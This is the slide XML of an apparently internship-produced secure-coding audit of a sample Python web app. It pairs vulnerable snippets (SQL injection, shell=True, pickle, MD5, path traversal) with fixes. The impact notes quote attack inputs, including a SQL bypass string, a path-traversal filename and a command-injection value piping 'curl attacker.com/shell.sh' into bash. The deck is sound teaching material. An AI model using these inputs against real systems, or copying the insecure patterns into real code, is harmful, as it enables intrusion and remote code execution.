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424"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="0D14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1828800" cy="182880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28600" y="2606040"/>
            <a:ext cx="2423160" cy="347472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26060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3081528"/>
            <a:ext cx="2423160" cy="34747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30815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3557016"/>
            <a:ext cx="2423160" cy="347472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5570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4032504"/>
            <a:ext cx="2423160" cy="34747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403250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5029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108960" y="11887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108960" y="1874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Application Security Audit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08960" y="2423160"/>
            <a:ext cx="1280160" cy="96012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4505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10896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2423160"/>
            <a:ext cx="1280160" cy="96012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4505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2628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423160"/>
            <a:ext cx="1280160" cy="9601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4505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4360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2423160"/>
            <a:ext cx="1280160" cy="96012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245059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0" y="3566160"/>
            <a:ext cx="5760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6576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3  •  Method: Static Analysis + AST Inspection  •  Tool: Custom Scanner + Bandit Rules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4114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Internship — Task 3  |  Author: Muntaha Ghafoor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08960" y="4480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github.com/Muntaha-Ghafoor  |  linkedin.com/in/muntaha-ghafoor-2b87a9386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audit was conducted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554480" cy="320040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554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640080" cy="64008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sample Python web application with common insecure coding patterns for audit.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143000"/>
            <a:ext cx="1554480" cy="3200400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143000"/>
            <a:ext cx="1554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280160"/>
            <a:ext cx="640080" cy="64008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Bandit (industry standard) and custom AST-based scanner to detect vulnerabilities automatically.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1143000"/>
            <a:ext cx="1554480" cy="32004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143000"/>
            <a:ext cx="1554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280160"/>
            <a:ext cx="640080" cy="6400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2560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code line-by-line for logic flaws, hardcoded secrets, and insecure API usage.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1143000"/>
            <a:ext cx="1554480" cy="320040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143000"/>
            <a:ext cx="1554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280160"/>
            <a:ext cx="640080" cy="64008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Mapping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2560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mapped to MITRE CWE (Common Weakness Enumeration) for industry-standard classification.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1143000"/>
            <a:ext cx="1554480" cy="320040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143000"/>
            <a:ext cx="1554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1280160"/>
            <a:ext cx="640080" cy="64008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0664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256032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secure code fixes and best practice recommendations for each vulnerability found.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Bandit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2880" y="4873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116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Pylint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4873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AST Module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4873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Tree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Safety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4873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CVEs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CWE/MITRE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98080" y="48737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Summary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vulnerabilities detected across 3 severity levels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828800" cy="1417320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="11182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1005840"/>
            <a:ext cx="1828800" cy="1417320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/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005840"/>
            <a:ext cx="1828800" cy="141732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34340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005840"/>
            <a:ext cx="1828800" cy="1417320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/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550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347472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87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587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587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587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587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8503920" cy="1920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6265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296265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296265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868680" cy="13716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97180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138160" y="296265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L.18-21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50108"/>
            <a:ext cx="8503920" cy="1920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16839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" y="316839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31683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3177540"/>
            <a:ext cx="868680" cy="13716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17754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138160" y="316839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L.33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355848"/>
            <a:ext cx="8503920" cy="1920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37413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337413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Hashing (MD5)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4920" y="337413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CWE-327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383280"/>
            <a:ext cx="868680" cy="13716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38328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138160" y="33741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L.41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3561588"/>
            <a:ext cx="8503920" cy="1920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57987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" y="35798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357987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3589020"/>
            <a:ext cx="868680" cy="13716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58902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138160" y="35798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L.49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3767328"/>
            <a:ext cx="8503920" cy="1920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78561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" y="37856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Deserialization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74920" y="378561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CWE-502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3794760"/>
            <a:ext cx="868680" cy="13716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79476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138160" y="378561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L.58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3973068"/>
            <a:ext cx="8503920" cy="1920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99135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V-06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43000" y="399135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74920" y="399135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17920" y="4000500"/>
            <a:ext cx="868680" cy="137160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400050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138160" y="399135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L.65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178808"/>
            <a:ext cx="8503920" cy="1920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19709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V-07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43000" y="419709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Logs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74920" y="41970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CWE-532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217920" y="4206240"/>
            <a:ext cx="868680" cy="137160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0" y="420624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138160" y="419709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L.77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" y="4384548"/>
            <a:ext cx="8503920" cy="1920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40283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V-08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3000" y="440283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Exception Handling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74920" y="440283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CWE-390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17920" y="4411980"/>
            <a:ext cx="868680" cy="137160"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/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441198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8138160" y="44028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L.89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0040" y="4590288"/>
            <a:ext cx="8503920" cy="19202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460857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43000" y="460857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PRNG / Insecure Token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074920" y="460857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CWE-338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4617720"/>
            <a:ext cx="868680" cy="137160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0" y="461772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8138160" y="46085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L.100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20040" y="4796028"/>
            <a:ext cx="8503920" cy="192024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" y="481431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V-10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143000" y="48143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Mode Enabled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074920" y="481431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CWE-215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217920" y="4823460"/>
            <a:ext cx="868680" cy="137160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17920" y="4823460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8138160" y="481431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L.106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CWE-798 — Use of Hard-coded Credentials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 = "admin123"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SECRET_KEY  = "mysecretkey"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ADMIN_USER  = "admin"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ADMIN_PASS  = "password"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 = os.getenv("DB_PASSWORD")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SECRET_KEY  = os.getenv("SECRET_KEY")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ADMIN_USER  = os.getenv("ADMIN_USER")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ADMIN_PASS  = os.getenv("ADMIN_PASS")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stored in plain text in source code. If the repository is made public or accessed by an attacker, all systems are immediately compromised.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environment variables via python-dotenv or a secrets vault (AWS Secrets Manager, HashiCorp Vault). Never commit .env files to version control.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unauthorized access to database, admin panel, and all connected services. Credentials are exposed in version history even after deletion.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 — SQL Injection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get_user(username):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 = sqlite3.connect("users.db")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 = conn.cursor()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query = "SELECT * FROM users "\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"WHERE username = '" + username + "'"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cursor.execute(query)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get_user(username):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 = sqlite3.connect("users.db")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 = conn.cursor()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Parameterized query — safe!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query = "SELECT * FROM users "\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"WHERE username = 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cursor.execute(query, (username,))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is directly concatenated into SQL query string. Attacker can inject SQL to bypass authentication, extract all data, or drop tables.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parameterized queries or an ORM (SQLAlchemy). Never format or concatenate user input into SQL strings. Use input validation as defense-in-depth.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bypass: username = ' OR '1'='1. Full database dump. Deletion of all records. If stacked queries allowed: OS command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Hashing (MD5)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CWE-327 — Use of Broken Cryptographic Algorithm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hash_password(password):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MD5 is cryptographically broken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hashlib.md5(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password.encode()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).hexdigest()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bcrypt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hash_password(password):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bcrypt with auto-generated salt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salt = bcrypt.gensalt(rounds=12)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hashed = bcrypt.hashpw(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password.encode(), salt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hashed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is cryptographically broken since 1996. MD5 hashes have no salt, enabling rainbow table attacks. A 6-char password is cracked in milliseconds.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bcrypt, argon2-cffi, or PBKDF2 with a unique salt per password. Never use MD5 or SHA1 for password storage. Use 12+ bcrypt rounds for production.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password database crackable with freely available rainbow tables. Attacker can authenticate as any user once database is compromised.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 via shell=True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CWE-78 — OS Command Injection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subprocess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ping_host(hostname):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User input passed to shell!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subprocess.call(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"ping -c 1 " + hostname,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shell=True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subprocess, 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ping_host(hostname):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Allowlist validation first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re.match(r'^[a-zA-Z0-9.-]+$', hostname):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ValueError("Invalid hostname")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= subprocess.call(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['ping', '-c', '1', hostname],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shell=False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input is passed directly to a shell command. Attacker can append shell operators to execute arbitrary OS commands on the server.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shell=False with list arguments — shell operators are not interpreted. Validate input with a strict allowlist regex before passing to any subprocess.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server compromise. Attacker input: '8.8.8.8; cat /etc/passwd' or '8.8.8.8; curl attacker.com/shell.sh | bash' for remote code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Deserialization (pickle)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CWE-502 — Deserialization of Untrusted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load_user_session(data):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pickle.loads on untrusted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data = Remote Code Execution!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pickle.loads(data)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hmac, hashlib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os.getenv("HMAC_SECRET")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load_user_session(data, sig):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Verify signature before use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 = hmac.new(SECRET, data,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hashlib.sha256).hexdigest()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hmac.compare_digest(sig, expected):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ValueError("Invalid signature")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json.loads(data)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pickle can execute arbitrary code during deserialization. An attacker who can send data to pickle.loads() instantly owns the server.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pickle for untrusted data. Use JSON for data exchange. If binary serialization is needed, sign with HMAC-SHA256 and verify before deserializing.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server takeover. Attacker crafts a malicious pickle payload that runs os.system('reverse shell') the moment the server deserializes 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V-06 + V-07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+ Password Logging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CWE-22 + CWE-532 — Path Traversal &amp; Data in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read_file(filename):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 sanitization!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= "/var/www/uploads/" + filename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open(path, "r")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f.read()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login(user, password):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print(f"password={password}")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read_file(filename):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 = Path("/var/www/uploads").resolve()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 = (base / filename).resolve()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not str(full).startswith(str(base)):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ValueError("Path traversal!")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full.read_text()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login(user, password):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logging.info(f"Login: user={user}")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traversal: filename='../../etc/passwd' reads system files. Password logging writes credentials to log files accessible to any log viewer or attacker.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pathlib resolve() and verify path stays within base dir. NEVER log passwords, tokens, or PII — log only username + timestamp + action result.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exposes /etc/passwd, SSH keys, config files. Password logging exposes user credentials to log aggregation systems, file-based attacks.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5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V-08 + V-09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457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Exception + Weak Random Token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CWE-390 + CWE-338 — Exception Handling &amp; Weak PRNG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VULNERABLE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divide(a, b):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Swallows ALL errors!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generate_token():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NOT cryptographically secure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str(random.randint(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100000, 999999))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CODE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3716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divide(a, b):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except ZeroDivisionError as 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logger.error(f"Division error: {e}")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secrets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generate_token():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Cryptographically secure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secrets.token_hex(32)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777240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1A080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'except' swallows ALL exceptions hiding bugs. random.randint has only 900,000 possible values — brute-forceable in under a second by an attacker.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23360" cy="777240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0818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992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REMEDIATION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2186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catch specific exceptions and log them. Use secrets.token_hex(32) or secrets.token_urlsafe(32) — backed by OS CSPRNG with 256-bit entropy.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0F1C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IMPACT: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867912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cause data corruption and security bypasses. Predictable tokens mean session hijacking: attacker brute-forces all 900K tokens in &lt;1 second.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rules to every Python project going forward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1133856"/>
            <a:ext cx="548640" cy="54864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15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python-dotenv or vaults. Never hardcode credentials. Add .env to .gitignore.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133856"/>
            <a:ext cx="548640" cy="54864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15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? placeholders in SQL. Use SQLAlchemy ORM for complex queries.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121408"/>
            <a:ext cx="548640" cy="54864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084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 Hashing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bcrypt (rounds=12+) or argon2. Never MD5, SHA1, or unsalted hashes.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121408"/>
            <a:ext cx="548640" cy="54864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2084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sanitize ALL user input. Use allowlists, not blocklists.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99232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3108960"/>
            <a:ext cx="548640" cy="54864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3072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Randomness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364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secrets module for tokens and keys. random module is for simulations only.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99232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3108960"/>
            <a:ext cx="548640" cy="54864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072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Logging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3364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user actions, never credentials. Use structured logging (structlog).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" y="4096512"/>
            <a:ext cx="548640" cy="54864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97280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Dangerous Funcs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97280" y="43525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pickle on untrusted data. No eval()/exec(). No shell=True with user input.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86784"/>
            <a:ext cx="411480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64608" y="4096512"/>
            <a:ext cx="548640" cy="54864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32120" y="4059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32120" y="43525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DEBUG=False in prod. Load config from env vars. Separate dev/prod configs.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Summary &amp; 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Vulnerabilities Found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886968"/>
            <a:ext cx="28346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8869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2529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Severity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234440"/>
            <a:ext cx="28346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234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(60%)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536192"/>
            <a:ext cx="841248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727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Severity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581912"/>
            <a:ext cx="283464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5819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(20%)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83664"/>
            <a:ext cx="8412480" cy="320040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Severity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929384"/>
            <a:ext cx="28346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92938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(10%)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31136"/>
            <a:ext cx="841248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677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Categories Covered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2276856"/>
            <a:ext cx="2834640" cy="22860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2768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578608"/>
            <a:ext cx="8412480" cy="320040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151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Audited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624328"/>
            <a:ext cx="28346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6243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Python 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962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Method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971800"/>
            <a:ext cx="28346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9718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+ AST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273552"/>
            <a:ext cx="8412480" cy="320040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0D15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3101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319272"/>
            <a:ext cx="2834640" cy="22860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319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fix for all HIGH findings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  Muntaha Ghafoor  |  CodeAlpha Internship — Task 3: Secure Coding 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github.com/Muntaha-Ghafoor  |  linkedin.com/in/muntaha-ghafoor-2b87a9386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Coding Review — Python</dc:title>
  <dc:subject>PptxGenJS Presentation</dc:subject>
  <dc:creator>PptxGenJS</dc:creator>
  <cp:lastModifiedBy>PptxGenJS</cp:lastModifiedBy>
  <cp:revision>1</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-06-11T06:58:24Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-06-11T06:58:24Z</dcterms:modified>
</cp:coreProperties>
</file>